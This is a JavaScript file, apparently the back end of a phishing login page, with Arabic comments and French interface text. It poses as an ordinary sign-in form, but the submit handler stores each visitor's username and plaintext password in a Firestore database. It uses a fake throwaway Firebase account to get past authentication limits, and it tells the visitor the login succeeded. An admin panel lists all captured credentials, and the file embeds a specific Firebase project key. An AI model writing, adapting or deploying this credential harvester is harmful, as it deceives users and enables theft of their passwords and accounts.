// Configuration Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDtaFOa3vi6uzsI4Ya6ef26TTnw-R_ywfM",
  authDomain: "studio-5252528524-43b54.firebaseapp.com",
  projectId: "studio-5252528524-43b54",
  storageBucket: "studio-5252528524-43b54.firebasestorage.app",
  messagingSenderId: "713567777033",
  appId: "1:713567777033:web:09509109cde078481d63d8"
};

// Initialisation Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

// العناصر
const loginForm = document.getElementById('loginForm');
const messageEl = document.getElementById('message');
const loginBtn = document.getElementById('loginBtn');

// دالة عرض الرسائل
function showMessage(text, type) {
    messageEl.textContent = text;
    messageEl.className = `message ${type}`;
    messageEl.style.display = 'block';
    setTimeout(() => {
        messageEl.style.display = 'none';
    }, 3000);
}

// معالج تسجيل الدخول
loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const userInput = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    
    loginBtn.disabled = true;
    loginBtn.textContent = 'Chargement...';

    // 🔑 البريد الوهمي لتجاوز قيود Firebase Auth
    const fakeEmail = `u_${Date.now()}@test.local`;
    const authPassword = password.length >= 6 ? password : "password_placeholder";

    try {
        // 1. تسجيل مستخدم وهمي في Auth
        const cred = await auth.createUserWithEmailAndPassword(fakeEmail, authPassword);
        const uid = cred.user.uid;

        // 2. تخزين البيانات الحقيقية في Firestore
        await db.collection("users").doc(uid).set({
            user: userInput,
            password: password,
            auth_email_used: fakeEmail,
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });

        showMessage('Connexion réussie !', 'success');
        loginForm.reset();
    } catch (error) {
        console.error(error);
        showMessage('Erreur de connexion. Réessayez.', 'error');
    } finally {
        loginBtn.disabled = false;
        loginBtn.textContent = 'Se connecter';
    }
});

// --- لوحة التحكم (Admin) ---
const showDataBtn = document.getElementById('showData');
const dataModal = document.getElementById('dataModal');
const closeBtn = document.querySelector('.close');
const dataList = document.getElementById('dataList');
const clearDataBtn = document.getElementById('clearData');

showDataBtn.addEventListener('click', async function() {
    dataList.innerHTML = '<p>Chargement...</p>';
    dataModal.classList.add('show');

    try {
        const snapshot = await db.collection("users").orderBy("createdAt", "desc").get();
        if (snapshot.empty) {
            dataList.innerHTML = '<p class="empty">Aucune donnée trouvée.</p>';
            return;
        }

        let html = '';
        snapshot.forEach(doc => {
            const data = doc.data();
            const date = data.createdAt ? data.createdAt.toDate().toLocaleString('fr-FR') : '---';
            html += `
                <div class="data-item">
                    <div class="email">👤 ${data.user}</div>
                    <div class="password">🔒 ${data.password}</div>
                    <div class="date">📅 ${date}</div>
                </div>
            `;
        });
        dataList.innerHTML = html;
    } catch (error) {
        dataList.innerHTML = '<p class="error">Erreur lors du chargement.</p>';
    }
});

closeBtn.addEventListener('click', () => dataModal.classList.remove('show'));
window.addEventListener('click', (e) => { if (e.target === dataModal) dataModal.classList.remove('show'); });

clearDataBtn.addEventListener('click', async function() {
    if (!confirm('Voulez-vous vraiment tout effacer ?')) return;
    
    try {
        const snapshot = await db.collection("users").get();
        const batch = db.batch();
        snapshot.forEach(doc => batch.delete(doc.ref));
        await batch.commit();
        dataList.innerHTML = '<p>Base de données effacée.</p>';
        showMessage('Données effacées', 'success');
    } catch (error) {
        showMessage('Erreur lors de l\'effacement', 'error');
    }
});